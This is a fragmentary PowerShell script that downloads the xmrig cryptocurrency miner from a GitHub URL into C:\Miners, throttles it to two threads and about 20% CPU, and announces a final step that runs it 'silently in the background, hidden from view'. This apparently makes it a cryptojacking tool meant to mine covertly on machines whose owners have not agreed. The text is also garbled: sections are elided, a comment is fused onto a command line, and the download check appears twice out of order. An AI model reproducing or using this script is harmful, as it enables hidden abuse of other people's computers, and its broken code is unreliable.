...
if (-not (Test-Path -Path $minerPath)) {
    Write-Host "Downloading the miner..."# Path to miner executable
$minerUrl = "https://github.com/Mrx-coder-1157/mining-scripts/raw/main/xmrig.exe"
$minerPath = "C:\Miners\xmrig.exe"
...
if (-not (Test-Path "C:\Miners")) { New-Item -Path "C:\Miners" -ItemType Directory }
if (-not (Test-Path "C:\Miners\Logs")) { New-Item -Path "C:\Miners\Logs" -ItemType Directory }

# Step 2: Download the miner if it's not already downloaded
if (-not (Test-Path -Path $minerPath)) {
...
# Step 3: Set the arguments for low CPU usage, 2 threads, GPU if available
$cpuThreads = 2
...
# Step 4: Ensure we're limiting the CPU usage to 20% for the miner
$cpuLimitScript = @'
...
# Step 5: Run the miner silently in the background, hidden from view
